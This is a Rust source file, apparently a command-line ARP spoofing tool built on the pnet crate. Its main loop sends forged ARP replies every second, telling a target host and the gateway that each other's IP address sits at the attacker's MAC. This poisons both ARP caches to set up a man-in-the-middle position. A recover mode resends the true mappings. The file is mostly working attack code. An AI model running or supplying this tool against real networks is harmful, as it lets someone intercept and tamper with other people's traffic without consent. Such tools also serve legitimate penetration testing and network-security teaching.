extern crate pnet;

use pnet::datalink::*;
use pnet::packet::arp::*;
use pnet::packet::ethernet::*;
use pnet::packet::{MutablePacket, Packet};
use std::net::*;
use std::{thread, time::Duration};

pub mod cli;
pub mod config;

fn build_arp_packet(
    operation: ArpOperation,
    host_ip: Ipv4Addr,
    host_mac: MacAddr,
    target_ip: Ipv4Addr,
    target_mac: MacAddr,
) -> Vec<u8> {
    let mut a_buffer = [0u8; 28];
    let mut a_packet = MutableArpPacket::new(&mut a_buffer).unwrap();

    a_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    a_packet.set_protocol_type(EtherTypes::Ipv4);
    a_packet.set_operation(operation);
    a_packet.set_hw_addr_len(6);
    a_packet.set_proto_addr_len(4);
    a_packet.set_sender_hw_addr(host_mac);
    a_packet.set_sender_proto_addr(host_ip);
    a_packet.set_target_hw_addr(target_mac);
    a_packet.set_target_proto_addr(target_ip);

    a_packet.packet_mut().to_owned()
}

fn build_ethernet_packet(host_mac: MacAddr, target_mac: MacAddr, arp_packet: &Vec<u8>) -> Vec<u8> {
    let mut e_buffer = [0u8; 42];
    let mut e_packet = MutableEthernetPacket::new(&mut e_buffer).unwrap();
    e_packet.set_destination(target_mac);
    e_packet.set_source(host_mac);
    e_packet.set_ethertype(EtherTypes::Arp);
    e_packet.set_payload(&arp_packet);
    e_packet.packet().to_owned()
}

fn get_interface(iface_name: &str) -> NetworkInterface {
    let interface = pnet::datalink::interfaces()
        .into_iter()
        .find(|iface| iface.name == iface_name)
        .expect("Cannot find interface");
    interface
}

fn send_arp_reply(
    tx: &mut Box<dyn pnet::datalink::DataLinkSender>,
    src_ip: Ipv4Addr,
    src_mac: MacAddr,
    target_ip: Ipv4Addr,
    target_mac: MacAddr,
) {
    let arp_packet = build_arp_packet(
        ArpOperations::Reply, // ArpOperations::[ Request , Reply ]
        src_ip,
        src_mac,
        target_ip,
        target_mac,
    );
    let ethernet_packet = build_ethernet_packet(src_mac, target_mac, &arp_packet);
    tx.send_to(&ethernet_packet, None);
    println!("{}, {} is at {}", target_mac, src_ip, src_mac);
}

fn restore_table(params: &config::Params, tx: &mut Box<dyn pnet::datalink::DataLinkSender>) {
    send_arp_reply(
        tx,
        params.host_ip,
        params.host_mac,
        params.gateway_ip,
        params.gateway_mac,
    );
    send_arp_reply(
        tx,
        params.target_ip,
        params.target_mac,
        params.gateway_ip,
        params.gateway_mac,
    );
    send_arp_reply(
        tx,
        params.gateway_ip,
        params.gateway_mac,
        params.target_ip,
        params.target_mac,
    );
    thread::sleep(Duration::from_secs(1));
}

fn main() {
    let params = cli::command_line_start();
    let interface = get_interface(&params.interface);
    println!("Source MAC address: {}", params.host_mac);
    println!("Source IP address:  {}", params.host_ip);

    let (mut tx, _) = match channel(&interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!(
            "An error occurred when creating the datalink channel: {}",
            e
        ),
    };

    if !params.recover {
        loop {
            send_arp_reply(
                &mut tx,
                params.gateway_ip,
                params.host_mac,
                params.target_ip,
                params.target_mac,
            );
            send_arp_reply(
                &mut tx,
                params.target_ip,
                params.host_mac,
                params.gateway_ip,
                params.gateway_mac,
            );
            thread::sleep(Duration::from_secs(1));
        }
    } else {
        restore_table(&params, &mut tx);
        restore_table(&params, &mut tx);
    }
}
